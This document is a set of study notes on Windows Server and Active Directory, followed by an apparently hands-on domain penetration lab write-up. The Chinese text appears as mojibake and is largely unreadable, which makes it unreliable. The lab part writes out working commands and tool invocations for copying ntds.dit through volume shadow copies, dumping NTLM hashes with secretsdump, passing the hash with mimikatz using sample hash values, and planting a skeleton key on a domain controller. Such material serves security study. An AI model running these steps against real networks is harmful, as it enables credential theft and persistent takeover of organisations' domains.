ËØÅ‰π¶ÊúçÂä°Ê¥ªÂä®ÁõÆÂΩïË¥üË¥£ÁõÆÂΩïÊï∞ÊçÆÂ∫ìÔºàÂç≥C:\\windows\\ntds\\ntds.ditÔºâÁöÑÊìç‰ΩúÔºåÊñπ‰æøÁî®Êà∑ÊâæÂØªÊï∞ÊçÆ„ÄÇÊ¥ªÂä®ÁõÆÂΩïÂ≠òÂÇ®Âú®ÂüüÊéßÂà∂Âô®‰∏≠„ÄÇÊØè‰∏™ÂüüÊúâ‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÂüüÊéßÂà∂Âô®ÔºàÂêå‰∏Ä‰∏™ÂüüÂÜÖÊØè‰∏™ÊéßÂà∂Âô®‰∏≠ÁöÑÊ¥ªÂä®ÁõÆÂΩïÁõ∏ÂêåÔºâÔºåÂàÜÊãÖÂ∑•‰ΩúÂíå‰ªªÂä°„ÄÇÂüüÊéßÂà∂Âô®ÁÆ°ÁêÜÊâÄÊúâÁΩëÁªúËÆøÈóÆ„ÄÇÊ¥ªÂä®ÁõÆÂΩïÂèØ‰ª•ÂåÖÂê´‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÂüüÔºàÂüüÊûóÔºâ„ÄÇ1.2 ÁªìÊûÑ1.2.1 ÈÄªËæëÁªìÊûÑÔºö  Âüü  ÁªÑÁªáÂçïÂÖÉÔºöÂÆπÂô®ÂØπË±°ÔºåÂ±ÄÈôê‰∫éÂüüÁöÑÂÜÖÈÉ®  ÂüüÊ†ëÔºöËøûÁª≠ÂëΩÂêçÁ©∫Èó¥ÁöÑÂ±ÇÊ¨°ÁªìÊûÑ  ÂüüÊûóÔºö‰∏çÂÖ±‰∫´ËøûÁª≠ÂëΩÂêçÁ©∫Èó¥ÁöÑÂüüÊ†ëÁªÑÊàê1.2.2 Áâ©ÁêÜÁªìÊûÑ  Á´ôÁÇπ  ÂüüÊéßÂà∂Âô®ÔºöÂ§ö‰∏ªÊú∫Â§çÂà∂Ôºå‰ΩÜ‰ªçÈúÄÊåáÂÆöÂÖ®Â±ÄÁõÆÂΩïÊúçÂä°Âô®1.2.3 È¢ùÂ§ñÂüü„ÄÅÂ≠êÂüü‰∏é‰ø°‰ªªÂÖ≥Á≥ª  È¢ùÂ§ñÂüüÊéßÂà∂Âô®Ôºö‰∏ªÂüüÊéßÂà∂Âô®ÁöÑÂ§á‰ªΩÂíåËæÖÂä©  ‰ø°‰ªªÂÖ≥Á≥ªÔºö          ÂèØ‰º†ÈÄí‰ø°‰ªª„ÄÅ                  Âø´Êç∑‰ø°‰ªª          Êûó‰ø°‰ªª          È¢ÜÂüü‰ø°‰ªª                    ÈùûÂèØ‰º†ÈÄí‰ø°‰ªª      2. Áî®Êà∑‰∏éÁªÑÁ≠ñÁï•2.1 Áî®Êà∑‰∏éÁªÑÁÆ°ÁêÜ  Áî®Êà∑ÁªÑ          Á≥ªÁªüÈªòËÆ§ÁªÑ      Êñ∞ÁªÑ        ÁªÑÁªáÂçïÂÖÉ  ÈÖçÁΩÆÊñá‰ª∂2.2 ÁªÑÁ≠ñÁï•ÂíåÂ∫îÁî®‰ªã‰∫éÊéßÂà∂Èù¢ÊùøÂíåÊ≥®ÂÜåË°®‰πãÈó¥ÁöÑ‰øÆÊîπÁ≥ªÁªü„ÄÅËÆæÁΩÆÁ®ãÂ∫èÁöÑÂ∑•ÂÖ∑„ÄÇ  ÁªÑÁ≠ñÁï•ÂØπË±°ÁªÑ‰ª∂ GPO          ÁªÑÁ≠ñÁï•ÂÆπÂô®ÁªÑ‰ª∂ GPC      ÁªÑÁ≠ñÁï•Ê®°ÊùøÁªÑ‰ª∂ GPT        ÂÆ¢Êà∑Á´ØÊãìÂ±ïÁªÑ‰ª∂ CSE  ÁªÑÁ≠ñÁï•ÁºñËæëÂô®ÁªÑ‰ª∂ GPE  ËÆ°ÁÆóÊú∫Á≠ñÁï•ÂíåÁî®Êà∑Á≠ñÁï•ÁªÑ‰ª∂  ÁªÑÁ≠ñÁï•ÂíåÊú¨Âú∞Á≠ñÁï•ÁªÑ‰ª∂3. DHCPÊúçÂä°‰∏éDNSÊúçÂä°3.1 Ê¶ÇÂøµÂä®ÊÄÅ‰∏ªÊú∫ÂàÜÈÖçÂçèËÆÆÔºåÊñπ‰æøÂÆ¢Êà∑Á´ØÊâπÈáèËá™Âä®Ëé∑ÂèñIPÂú∞ÂùÄÔºåÂÖ∂ÁßüÂÄüËøáÁ®ãÂ¶Ç‰∏ãÔºö  ÂÆ¢Êà∑Á´Ø‰ª•0.0.0.0‰Ωú‰∏∫Ëá™Â∑±ÁöÑIPÂú∞ÂùÄÔºå255.255.255.255‰Ωú‰∏∫DHCPÊúçÂä°Âô®Âú∞ÂùÄÔºåÂπøÊí≠DHCPÂèëÁé∞‰ø°ÊÅØÔºåÂåÖÂê´ÁΩëÂç°MacÂú∞ÂùÄÂíåNetBIOSÂêçÁß∞„ÄÇ  ÊØèÈöî‰∏ÄÊÆµÊó∂Èó¥ÂèëÈÄÅ‰∏ÄÊ¨°Áõ¥Âà∞Êî∂Âà∞ÂõûÂ§çÔºåÊàñËÄÖËá™Âä®ÈÄâÂÆö‰øùÁïôIPÂú∞ÂùÄÊÆµÁöÑ‰∏Ä‰∏™Ôºå‰øùËØÅÊ≤°ÊúâDHCPÊúçÂä°Âô®ÁΩëÁªú‰ªçËÉΩËøêË°å„ÄÇ  ÂÆ¢Êà∑ÂçïÊî∂Âà∞Á¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÂêé‰ª•ÂπøÊí≠ÊñπÂºèÂëäÁü•ÊâÄÊúâÊúçÂä°Âô®„ÄÇ3.2 Âú®ÊúçÂä°Âô®‰∏≠Ôºå‰ª•IP‰ΩúÁî®Âüü‰Ωú‰∏∫Âü∫Êú¨ÁÆ°ÁêÜÂçï‰Ωç„ÄÇIP‰ΩúÁî®ÂüüÂ∞±ÊòØÁΩëÁªú‰∏≠ÂèØÁÆ°ÁêÜÁöÑIPÂú∞ÂùÄÂàÜÁªÑ„ÄÇË∂ÖÁ∫ß‰ΩúÁî®ÂüüÊòØDHCPÊúçÂä°Âô®‰∏äÊúâÂ§ö‰∏™‰ΩúÁî®ÂüüÔºåÁî®‰∫éÂ§öÁΩëÈÖçÁΩÆ„ÄÇ3.3 DHCP‰∏≠Áªß‰ª£ÁêÜÔºöÂ∞ÜËØ∑Ê±ÇÂèëÈÄÅÂà∞ËøúÁ´ØÁöÑDHCPÊúçÂä°Âô®‰∏ä„ÄÇ3.4 ÂüüÂêçÁ≥ªÁªüÔºåÂÆûÁé∞ÂêçÁß∞‰∏éIPÂú∞ÂùÄÁöÑËΩ¨Êç¢Ôºå‰∏ªË¶ÅÂåÖÊã¨Ôºö  DNSÂüüÂëΩÂêçÁ©∫Èó¥  ËµÑÊ∫êËÆ∞ÂΩï  ÊúçÂä°Âô®  ÂÆ¢Êà∑Á´Ø3.5 Êü•ËØ¢Ê®°ÂºèÔºöÈÄíÂΩíÊü•ËØ¢„ÄÅËø≠‰ª£Êü•ËØ¢„ÄÅÂèçÂêëÊü•ËØ¢4. Êñá‰ª∂ÊúçÂä°‰∏éËØÅ‰π¶ÊúçÂä°4.1 ÈÄöËøáÊñá‰ª∂ÊúçÂä°Âô®ÔºåËÆæÁΩÆÂÖ±‰∫´Êñá‰ª∂Â§πÔºåÂπ∂Áªô‰∫à‰∏çÂêåÁî®Êà∑‰∏çÂêåÁöÑÊùÉÈôê„ÄÇÂè¶Â§ñÔºåÂèØ‰ª•‰ΩøÁî®ËµÑÊ∫êÁÆ°ÁêÜÂô®ÂÆûÁé∞Êñá‰ª∂ÂÖ±‰∫´ÔºõÈÄöËøáËÑ±Êú∫ËÆæÁΩÆÂÆûÁé∞Á¶ªÁ∫øËÆøÈóÆÂÖ±‰∫´ËµÑÊ∫ê„ÄÇ4.2 ËµÑÊ∫êËÆøÈóÆÊùÉÈôêÁöÑÊéßÂà∂ÔºöNTFS„ÄÇNTFSÊòØ‰ªéWindows NTÂºÄÂßãÂºïÂÖ•ÁöÑÊñá‰ª∂Á≥ªÁªüÔºåÂèØ‰ª•‰∏∫Êñá‰ª∂Â§πÂíåÊñá‰ª∂ÊéàÊùÉÔºåÊîØÊåÅÊï∞ÊçÆÂéãÁº©ÂíåÁ£ÅÁõòÈôêÈ¢ùÔºå‰ΩÜ‰∏çÈÄÇÁî®‰∏éFATÊàñFAT32Êñá‰ª∂Á≥ªÁªü4.3 Á£ÅÁõòÈÖçÈ¢ùÔºö‰ª•Êñá‰ª∂ÊâÄÊúâÊùÉ‰∏∫Âü∫Á°ÄÔºåÂè™Â∫îÁî®‰∫éÂç∑Âπ∂ÁõëËßÜ‰∏™‰∫∫Áî®Êà∑Âç∑ÁöÑ‰ΩøÁî®ÊÉÖÂÜµ„ÄÇ4.4 ÂàÜÂ∏ÉÂºèÊñá‰ª∂Á≥ªÁªü DFSÔºö‰∏∫ÊâÄÊúâÂÖ±‰∫´Êñá‰ª∂Êèê‰æõËÆøÈóÆÁÇπÂíåÈÄªËæëÊ†ëÁªìÊûÑÔºå‰øùËØÅÊúçÂä°Á®≥ÂÆö„ÄÇ  Áã¨Á´ãÁöÑÊ†πÁõÆÂΩïÂàÜÂ∏ÉÂºèÊñá‰ª∂Á≥ªÁªüÔºöÁõÆÂΩï‰ø°ÊÅØÂ≠òÂÇ®Âú®Êú¨Âú∞‰∏ªÊúçÂä°Âô®‰∏ä„ÄÇÊ≤°ÊúâÊ†πÁ∫ßÂà´ÁöÑÂÆπÈîôÔºåÂç≥Ê†π‰∏çÂèØËææÂàôÊï¥‰∏™Á©∫Èó¥‰∏çÂèØËÆøÈóÆ„ÄÇ  ÂüüÂàÜÂ∏ÉÂºèÊñá‰ª∂Á≥ªÁªüÔºöÊãìÊâë‰ø°ÊÅØÂ≠òÂÇ®Âú®Ê¥ªÂä®ÁõÆÂΩïAD‰∏≠„ÄÇ4.5 Êï∞Â≠óËØÅ‰π¶ÊòØÁî±ËØÅ‰π¶È¢ÅÂèëÊú∫ÊûÑÔºàCertification AuthorityÔºâÊï∞Â≠óÁ≠æÂêçÁöÑ„ÄÅÂåÖÂê´Áî®Êà∑Ë∫´‰ªΩ‰ø°ÊÅØÂíåÁî®Êà∑ÂÖ¨Èí•‰ø°ÊÅØ‰ª•ÂèäË∫´‰ªΩÈ™åËØÅÊú∫ÊûÑÊï∞Â≠óÁ≠æÂêçÁöÑÊï∞ÊçÆ„ÄÇ  Ë∫´‰ªΩÈ™åËØÅÊú∫ÊûÑÁöÑÊï∞Â≠óÁ≠æÂêçÁ°Æ‰øù‰ø°ÊÅØÁúüÂÆûÊÄß  Áî®Êà∑ÂÖ¨Èí•‰ø°ÊÅØÁ°Æ‰øùÂÆåÊï¥ÊÄß  Áî®Êà∑Êï∞Â≠óÁ≠æÂêçÁ°Æ‰øù‰∏çÂèØÂê¶ËÆ§ÊÄßÊ≥®ÊÑèÔºöWindows 2008‰ΩøÁî®ÂÖ¨ÂÖ±ÂØÜÈí•Âü∫Á°ÄÁªìÊûÑÔºàPublic Key InfrastructureÔºâÔºåÂç≥ÈùûÂØπÁß∞Âä†ÂØÜÊäÄÊúØ„ÄÇÊ≥®ÊÑèÔºåÈÉ®ÁΩ≤‰∫ÜËØÅ‰π¶ÊúçÂä°Âô®ÂêéÔºåÊúçÂä°Âô®ÁöÑËÆ°ÁÆóÊú∫ÂêçÂíåÂüüÂêç‰∏çËÉΩÊõ¥ÊîπÔºå‰ΩÜÂèØ‰ª•Êõ¥ÊîπIPÂú∞ÂùÄ„ÄÇ5. Ê¥ªÂä®ÁõÆÂΩïÊùÉÈôêÁÆ°ÁêÜÊúçÂä°ÔºàAD Right Management ServicesÔºâÁõ∏ÂÖ≥ÁªÑ‰ª∂ÔºöÂ∫îÁî®Á®ãÂ∫è„ÄÅÊúçÂä°Âô®„ÄÅÂÆ¢Êà∑Á´Ø5.1 ÊùÉÈôêÁÆ°ÁêÜË¥¶Âè∑ËØÅ‰π¶ÁîüÊàêËøáÁ®ãÔºö  Áî®Êà∑Á¨¨‰∏ÄÊ¨°‰ΩøÁî®Âä†ÂØÜÊñáÊ°£‰πãÂâçÔºåÈúÄË¶ÅÂüüÁî®Êà∑Ë∫´‰ªΩÂêëAD RMSÊúçÂä°Âô®ÂèëÈÄÅËØ∑Ê±ÇÔºåËé∑ÂèñËØÅ‰π¶„ÄÇ  ÊúçÂä°Âô®Êï∞ÊçÆÂ∫ìÔºåËã•ÂØÜÈí•Â∑≤ÁªèÂ≠òÂú®Âàô‰ΩøÁî®ËØ•ÂØÜÈí•ÔºåÂê¶ÂàôÊñ∞Âª∫„ÄÇ  ÊúçÂä°Âô®Â∞ÜÁî®Êà∑ÂØÜÈí•‰∏≠ÁßÅÈí•Áî®ÊúçÂä°Âô®ÁöÑÁßÅÈí•Âä†ÂØÜÔºåÂπ∂Â∞ÜÂÖ¨Èí•ÂíåÂä†ÂØÜ‰∫ÜÁöÑÁßÅÈí•ÊîæÂà∞ÊùÉÈôêÁÆ°ÁêÜË¥¶Êà∑ËØÅ‰π¶‰∏≠„ÄÇ  ÊùÉÈôêÁÆ°ÁêÜË¥¶Êà∑ËØÅ‰π¶Ë¢´ÊúçÂä°Âô®Áî®ÁßÅÈí•Á≠æÂêçÔºåÂπ∂ÂèëÈÄÅÁªôÁî®Êà∑„ÄÇ  ÊúçÂä°Âô®Â∞ÜÁî®Êà∑ÁöÑÂØÜÈí•ÂØπÂ≠òÂÇ®Âà∞AD RMSÊï∞ÊçÆÂ∫ì‰∏≠„ÄÇ5.2 AD RMSÂÆûÁé∞ÂéüÁêÜ5.1.1 ÊúçÂä°ÁöÑÂèëÁé∞5.1.2 ÊñáÊ°£Âú®Á∫øÂèëÂ∏ÉËøáÁ®ã5.1.3 ÊñáÊ°£Á¶ªÁ∫øÂèëÂ∏ÉËøáÁ®ã5.1.4 Âèó‰øùÊä§ÊñáÊ°£‰ΩøÁî®ËøáÁ®ãÊúçÂä°Âô®ËôöÊãüÂåñÔºàHyper-VÔºâ‰∏éËôöÊãüÊú∫‰∏çÂêåÔºåHyper-VÁÆ°ÁêÜÁöÑËôöÊãüÊú∫Áõ¥Êé•ËøêË°åÂú®Â∫ïÂ±ÇÔºåÁõ∏ÂΩì‰∫éÁã¨Á´ãÁöÑËÆ°ÁÆóÊú∫„ÄÇÁΩëÁªúËÆøÈóÆ‰øùÊä§ÔºàNetwork Access ProtectionÔºâÊ£ÄÊü•ËÅîÂÖ•ÂÜÖÁΩëÁöÑÁîµËÑëÊòØÂê¶ÂÆâÂÖ®ÔºåÂàÜ‰∏∫4‰∏™ÈÉ®ÂàÜÔºö  Á≠ñÁï•È™åËØÅ  ÈöîÁ¶ª  Ë°•Êïë  ÊåÅÁª≠ÁõëÊéßÈò≤ÁÅ´Â¢ôIPSec‰ªéWindows Server 2003ÂºÄÂßã‰ΩøÁî®Ôºå‰Ωç‰∫éÁΩëÁªúÂ±ÇÔºåÂèØ‰ª•Èò≤Ê≠¢‰∏≠Èó¥‰∫∫ÊîªÂáª„ÄÅÊé¢ÊµãÊîªÂáª„ÄÅÈáçÊîæÊîªÂáª„ÄÅÊú™ËÆ§ËØÅÁöÑÁΩëÁªúÂ∫îÁî®Á®ãÂ∫èËÆøÈóÆ„ÄÅÂè™ÈÄÇÁî®IPÂú∞ÂùÄËÆ§ËØÅÁöÑÁΩëÁªúÂ∫îÁî®Á®ãÂ∫èÁöÑËÆøÈóÆ„ÄÇIPSecÊúâ‰∏§ÁßçÊ®°ÂºèÔºö‰º†ËæìÊ®°ÂºèÂíåÈÄöÈÅìÊ®°Âºè„ÄÇIPSec‰ΩøÁî®‰∏§ÁßçÂçèËÆÆÔºöAHÂíåESP„ÄÇInternetÂØÜÈí•‰∫§Êç¢ÂçèËÆÆÔºàIKEÔºâÔºöInternetÂÆâÂÖ®ÂÖ≥ËÅîÂíåÂØÜÈí•ÁÆ°ÁêÜÂçèËÆÆÔºàISAKMPÔºâÂíåOakleyÈáëÈí•‰∫§Êç¢ÂçèËÆÆÁöÑÁªÑÂêàÔºåÂàÜ‰∏∫3‰∏™Ê®°ÂºèÔºö‰∏ªÊ®°Âºè„ÄÅÂø´ÈÄüÊ®°ÂºèÂíåÁî®Êà∑Ê®°Âºè„ÄÇATA[90 days free trial]The Advanced Threat Analytics is a platform to protect the system from cyber attacks. The informatino collected by ATA via:  Port mirroring from DC and DNS server to the ATA gateway  Deploy gateway on Domian ControllerATA receives events and log from:  SIEM intergration  Windows Event ForwardingATA detects suspicious activities:  Reconnaissance  Lateral movement cycle  Domain dominance (persistence)which including:  Pass-the-Ticket (PtT)  Pass-the-Hash (PtH)  Overpass-the-Hash  Forged PAC (MS14-068)  Golden Ticket  Malicious replications  Reconnaissance  Brute Force  Remote execution‰∏âÂ•ΩÂ≠¶ÁîüÂüüÊ∏óÈÄèÊñáÁ´†Â§çÁé∞‰∏éÊÄªÁªì1. ÂüüÊ∏óÈÄè‚Äî‚ÄîËé∑ÂæóÂüüÊéßÊúçÂä°Âô®ÁöÑNTDS.ditÊñá‰ª∂1.1 ÈÄöËøáVSSÊúçÂä°‰∏ãÁöÑÂëΩ‰ª§Ëé∑ÂæóÂüüÊéßÊúçÂä°Âô®NTDS.ditÊñá‰ª∂ConceptsÔºöVolume Shadow Copy Service (Volume Snapshot Service) used in manual or automatic backup copies even when they are in use. It contains a set of COM interfaces that implements a framework to allow volume backups to be performed while applications on a system continue to write to the volumes.ÊîØÊåÅWindows 2003‰ª•‰∏äÊìç‰ΩúÁ≥ªÁªü1.1.1 ‰ΩøÁî®ntdsutilÂÆûÁé∞‰ªésnapshot‰∏≠ÂæóÂà∞ntds.ditÊîØÊåÅWindows 2003‰ª•‰∏äÁöÑÁ≥ªÁªü  create snapshotÔºöntdsutil snapshot \"activate instance ntds\" create quit quit  load the snapshot: ntdsutil snapshot \"mount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  copy ntds.dit: copy C:\\$SNAP_201810291848_VOLUMEC$\\windows\\NTDS\\ntds.dit c:\\ntds.dit  unload the snapshot: ntdsutil snapshot  \"unmount {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quit  delete the snapshot: ntdsutil snapshot  \"delete {ef0cadb1-a0f0-46c2-a4de-d6faaef0e199}\" quit quitÊ≥®ÊÑèÔºö‰ΩøÁî®VSSÊúçÂä°‰ºö‰∫ßÁîüÊó•ÂøóÔºåID‰∏∫7036„ÄÇcreate snapshot‰ºö‰∫ßÁîüÊó•ÂøóID‰∏∫7036(ÂÆûÈôÖÊµãËØïÊó∂Âπ∂Êú™ÂèëÁé∞)„ÄÇ1.1.2 vssadminÊîØÊåÅwindows 2008‰ª•‰∏äÁ≥ªÁªü  search current existing shadow: vssadmin list shadows  create the shadow: vssadmin create shadow /for=c:  copy ntds.dit: copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy2\\windows\\NTDS\\ntds.dit c:\\ntds.dit  delete the shadow: vssadmin delete shadows /for=c: /quiet1.1.3 vshadow.exeÁ≥ªÁªüÈªòËÆ§Êú™ÂÆâË£ÖÔºåÈúÄË¶ÅÂú®Microsoft Windows Software Development Kit (SDK)‰∏≠Ëé∑Âèñ„ÄÇvshadow.exeÂåÖÂê´ÂæÆËΩØÁ≠æÂêçÔºåËÉΩÁªïËøáÊüê‰∫õÁôΩÂêçÂçïÁöÑÈôêÂà∂„ÄÇÂ¶ÇÊûú‰Ωú‰∏∫ÂêØÂä®È°πÔºåAutorunsÁöÑÈªòËÆ§ÂêØÂä®ÂàóË°®‰∏çÊòæÁ§∫„ÄÇTutorial1.1.4 vssown.vbsÈÄöËøáwmiÂØπShadowcopyËøõË°åÊéßÂà∂ÔºånishangÈáåÊúâpowershellÁâàÊú¨1.2 ÈÄöËøáNinjaCopyËé∑ÂæóÂüüÊéßÊúçÂä°Âô®NTDS.ditÊñá‰ª∂powershell ËøêË°åËÑöÊú¨Â§±Ë¥•ÔºåËØ≠Ê≥ïÈîôËØØÔºåÂæÖÁ†îÁ©∂„ÄÇ1.3 Â¶Ç‰Ωï‰ªéNTDS.ditÊñá‰ª∂‰∏≠Ëé∑ÂèñÂÖ≥ÈîÆ‰ø°ÊÅØ1.3.1 Ëé∑ÂèñÂêÑ‰∏™Áî®Êà∑ÁöÑNTLMÁöÑhashÂÄºÈ¶ñÂÖàÔºåÈúÄË¶ÅÂà©Áî®system hiveÊñá‰ª∂Á†¥Ëß£ntds.ditÊñá‰ª∂Ôºå‰ΩøÁî®Ê≥®ÂÜåË°®ÁºñËæëÂô®Áõ¥Êé•ÂØºÂá∫ÁöÑregÊñá‰ª∂Êó†Ê≥ïÁî®‰∫éÁ†¥Ëß£ÔºåÈúÄË¶Å‰∫åËøõÂà∂Ê†ºÂºèÁöÑsystem hiveÊñá‰ª∂„ÄÇËé∑ÂèñÊñπÊ≥ïÂ¶Ç‰∏ãÔºö  Step 1: Ëé∑Âèñsystem hiveÊñá‰ª∂          reg export HKLM\\System system.regreg save HKLM\\System system.hivThe first one can be opened using any text editor; the latter is a full binary dump, and can be opened by loading it in REGEDIT.            Step 2: ÂèñÂæóÂêÑ‰∏™Ë¥¶Âè∑ÁöÑhashÂÄº                  Method 1: ‰ΩøÁî®Impacket/secretsdump.pyÂèñÂæóÊâÄÊúâË¥¶Êà∑ÁöÑhashÂÄº   $ python secretdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/systemhive LOCAL                    Method 2: ‰ΩøÁî®esedbexport   /usr/local/bin/esedbexport -m tables ntds.dit              Step 3: Êú™ÂÆåÊàêÁ†¥Ëß£hashÂÄº          hashcat kaliËôöÊãüÊú∫Êó†Ê≥ï‰ΩøÁî®Ôºå‰ºº‰πéÈúÄË¶ÅGPU      1.3.2: ‰ΩøÁî®ntdsxtractËé∑ÂèñÂüüÂêç‰ø°ÊÅØ  Step 1Ôºö ÂÆâË£Ö  $ wget https://github.com/libyal/libesedb/releases/download/20170121/libesedb-experimental-20170121.tar.gz  $ tar xf libesedb-experimental-20170121.tar.gz  $ cd libesedb-20170121/  Step 2: Ê†πÊçÆÁ¨¨‰∏ÄÊ≠•ÂæóÂà∞ÁöÑË°®Ê†ºÔºåÈÄöËøádsuser.pyËÑöÊú¨ÂæóÂà∞ÂüüÂêçÁõ∏ÂÖ≥‰ø°ÊÅØ                                        dsusers.py ../test/ntds.dit.export/datatable.3 ../test/ntds.dit.export/link_table.5 output ‚Äìsyshive ../test/system.hiv ‚Äìpasswordhashes ‚Äìpwdformat ocl ‚Äìntoutfile ntout ‚Äìlmoutfile lmout            tee all_user_info.txt                              2. ÂüüÊ∏óÈÄè‚Äî‚ÄîPass The HashÁöÑÂÆûÁé∞Principle: Attacker use latent NTLM hash instead of plaintext password to authenticate to a remote server.Â∏∏Áî®Â∑•ÂÖ∑Ôºö2.1 Kali:\t- meterpreter\t- Tool: pass the hash2.2 windows\t- python: wmiexec\t- powershell: powershell\t\t- Invoke-WMIExec\t\t- Invoke-SMBExec\t\t- Invoke-SMBClient \t \t- mimikatz: ÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôê\t\t- ‰ΩøÁî®pass the ticket‰∏çÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôêÔºå‰ΩÜÈúÄË¶ÅÂè¶‰∏Ä‰∏™Â∑•ÂÖ∑kekeoÊïôÁ®ãStep 1: Ëé∑ÂèñÁî®Êà∑hashÂÄºÔºåÁªìÊûúÂ¶Ç‰∏ãÊâÄÁ§∫Administrator:500:aad3b435b51404eeaad3b435b51404ee:1dda962106ebf0bd4218bc4d0a78f0c9:::            Experiment Information      ¬†                  Username      Administrator              Domain      test              NTLM      1dda962106ebf0bd4218bc4d0a78f0c9              AES256      ¬†      Step 2Ôºö ‰ΩøÁî®mimikatzÂÆûÁé∞pass the hashMethod 1: ‰ΩøÁî®Ë¥¶Êà∑hashÂÄºÔºåÈúÄË¶ÅÁÆ°ÁêÜÂëòÊùÉÈôêÔºåmimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:test.com /ntlm:1dda962106ebf0bd4218bc4d0a78f0c9\"‰ºöÂºπÂá∫‰∏Ä‰∏™cmdÔºåÂèØ‰ª•ÈÄöËøádir \\\\192.168.139.101\\c$ÂÆûÁé∞Êü•ÁúãAdministratorÁöÑ‰∏ªÁõÆÂΩïÔºåÂÖ∑‰ΩìÂÖ∂‰ªñÁî®Ê≥ïËøòÈúÄË¶ÅÁ†îÁ©∂„ÄÇsekurlsa::pth /user:WORKER1 /domain:test.local /ntlm:2c24919527e360383d7c4cd6c7b0aab0Method 2: ‰ΩøÁî®AES_HashÂÄºÔºåÈÄÇÁî®‰∫éÂÆâË£Ö‰∫ÜKB2871997Ë°•‰∏ÅÁöÑ‰∏ªÊú∫„ÄÇ[Êú™ÂÆûÁé∞]mimikatz: ÈÄöËøásekurlsa::ekeysÂèØ‰ª•Êü•ÁúãÊú¨Êú∫ÂÜÖÂ≠ò‰∏≠ÁöÑmimikatz \"privilege::debug\" \"sekurlsa::pth /user:Administrator /domain:test.com /aes256:aad4b3c9ed4b3f1ef04b5a69ff326c9bdc8c43214924fac1b96c88ad168891d3\" sekurlsa::pth /user:krbtgt /domain:test.local /aes256:159ee14fd120960a157b04dd92d1d4ba3debdf859834e76ea0d3f62cb4cf6ac1Áî®mimikatz \"sekurlsa::ekeys\"ÔºåÂèëÁé∞AdministratorË¥¶Êà∑Ê≤°ÊúâAES256ÂÄº„ÄÇÂæÖÁ†îÁ©∂Ôºå‰ºº‰πéÈúÄË¶ÅÊñ∞Âª∫‰∏Ä‰∏™ÁÆ°ÁêÜÂëòÊùÉÈôêÔºåÂéüÊú¨Ëá™Â∏¶AdministratorÊúâÂÆâÂÖ®ÈóÆÈ¢òÈúÄË¶ÅÁ¶ÅÁî®„ÄÇdir \\\\DCServer\\c$copy sn.txt \\\\DCServer\\c$net useËÆ°ÁÆóÊú∫ÁÆ°ÁêÜ-&gt;ÂÖ±‰∫´Êñá‰ª∂Â§π-&gt;ÂÖ±‰∫´Âüü‰∏≠ÂêÑ‰∏™Ë¥¶Âè∑ÁöÑÊÑè‰πâÂíåÊùÉÈôêAdministratorGuestkrbtgtDCServer3. ÂüüÊ∏óÈÄè‚Äî‚ÄîSkeleton KeyStep 1: Â∞ùËØïÂú®ÂüüÂÜÖ‰∏ªÊú∫‰∏éÂüüÊúçÂä°Âô®Âª∫Á´ãÁΩëÁªúËøûÊé•  net use \\\\DCServer.test.com Xjc123 /user:Administrator@test.comnet use \\\\DCServer.test.com Xjc123456 /user:Jason@test.comdir \\\\DCServer.test.com\\c$Âà†Èô§ÂΩìÂâçËøûÊé•Ôºönet use * /del /yStep 2: Âú®DC‰∏≠ÈÄöËøámimikatzÂÆûÁé∞ÂÆâË£Öskeleton key  privilege::debugmisc::skeletonmimikatzÁöÑÈªòËÆ§Skeleton KeyËÆæÁΩÆ‰∏∫mimikatzStep 3: Âú®ÂüüÂÜÖ‰∏ªÊú∫ÈÄöËøáskeleton keyÂÆûÁé∞Áî®‰ªªÊÑèË¥¶Âè∑ÁôªÂΩïDCÊµãËØïÂèëÁé∞Ôºå‰ΩøÁî®‰ªªÊÑèË¥¶Âè∑ÈÉΩËÉΩÂÆûÁé∞ËÆøÈóÆÂüüÊéßÂà∂Âô®LSA‰øùÊä§„Äê‰ºº‰πéÂú®windows 2008Ê≤°Áî®„ÄëStep 1: ËÆæÁΩÆLSA‰øùÊä§Ê≥®ÂÜåË°®‰ΩçÁΩÆÔºöHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\LsaÊñ∞Âª∫-DWORDÂÄºÔºåÂêçÁß∞‰∏∫RunAsPPL,Êï∞ÂÄº‰∏∫000000013. ÂüüÊ∏óÈÄè‚Äî‚ÄîDump Clear-Text Password after KB2871997 installed4. ÂüüÊ∏óÈÄè‚Äî‚ÄîPass The TicketÊºèÊ¥ûÔºöMS14-068Â∑•ÂÖ∑Ôºö  PyKEK  kekeo  ÈóÆÈ¢òÊÄªÁªì      Windows Server Âª∫Á´ãÂüüÁéØÂ¢ÉÂíåDNSÊúçÂä°Âô®Âêé‰ΩøÁî®nslookup\tÊó∂ÊòæÁ§∫DNS Server timed out:    Ëß£ÂÜ≥ÊñπÊ≥ï:Âú®DNSÂèçÂêëÊü•ÊâæÈáåÊñ∞Âª∫Âå∫ÂüüÔºåÂπ∂Êñ∞Âª∫ÊåáÈíàÔºåÊåáÂêëDNSÊúçÂä°Âô®„ÄÇ        Windows Server ÈÖçÁΩÆÈùôÊÄÅIPÂú∞ÂùÄÂíåDNSÊúçÂä°Âô®Êó∂ËæìÂÖ•ÂÆåÈªòËÆ§DNSÊúçÂä°Âô®IPÂú∞ÂùÄ‰ºöÈªòËÆ§ÂèòÊàêÁ©∫Ôºö    Ëß£ÂÜ≥ÊñπÊ≥ïÔºöËÆæÁΩÆ‰∏∫Ëá™Âä®Ëé∑ÂèñIPÂú∞ÂùÄÔºåÂÜçÈáçÊñ∞ËÆæÁΩÆ‰∏∫ÈùôÊÄÅIPÂç≥ÂèØËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ        Windows Server È´òÁ∫ßÂÖ±‰∫´ËÆæÁΩÆÔºåÊó†Ê≥ïÂêØÁî®ÁΩëÁªúÂèëÁé∞Ôºö    Ëß£ÂÜ≥ÊñπÊ≥ïÔºö ÂÖàÊ£ÄÊü•ÊòØÂê¶ÂèëÁîüÈóÆÈ¢ò2‰∏≠ÁöÑÊÉÖÂÜµÔºåÂÜçÊ£ÄÊü•ÊòØÂê¶ÂêØÁî®ÊúçÂä°Ôºö          Function Discovery 